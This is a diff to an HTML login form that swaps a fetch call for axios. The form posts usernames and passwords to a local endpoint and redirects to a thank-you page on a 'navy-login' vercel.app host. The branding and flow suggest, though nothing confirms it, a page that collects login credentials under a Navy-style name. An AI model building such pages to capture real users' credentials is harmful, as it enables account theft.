@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
     <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> -->
 
     <title>Login Form</title>
@@ -152,24 +154,33 @@ img {
 
 
 
-         fetch('http://localhost:3000/login ', {
-            method: 'POST',
-            //  mode: 'no-cors', 
+        //  fetch('http://localhost:3000/login ', {
+        //  fetch('https://navy-login.vercel.app/login ', {
+        //     method: 'POST',
+        //      mode: 'no-cors', 
+        //     headers: {
+        //     'Content-Type': 'application/json'
+        //     },
+        //     body: JSON.stringify({ username, password })
+        // })
+        axios.post('http://localhost:3000/login', {
+            username,
+            password
+        }, {
             headers: {
-            'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ username, password })
+                'Content-Type': 'application/json'
+            }
         })
-        .then(response => response.text())
         //  .then(data => console.log(data))
-        .then(data => {
-                if (data === 'Form data submitted successfully') {
-                    window.location.href = ' http://localhost:3000/thank-you.html';
-                } else {
-                    alert('Submission failed. Please try again.');
-                    // document.getElementById('loadingIcon').style.display = 'none';
-                }
-            })
+      .then(response => {
+            const data = response.data;
+            if (data === 'Form data submitted successfully') {
+                window.location.href = 'https://navy-login.vercel.app/thank-you.html';
+            } else {
+                alert('Submission failed. Please try again.');
+                // document.getElementById('loadingIcon').style.display = 'none';
+            }
+        })
         .catch(error => console.error('Error:', error));
         });
 </script>
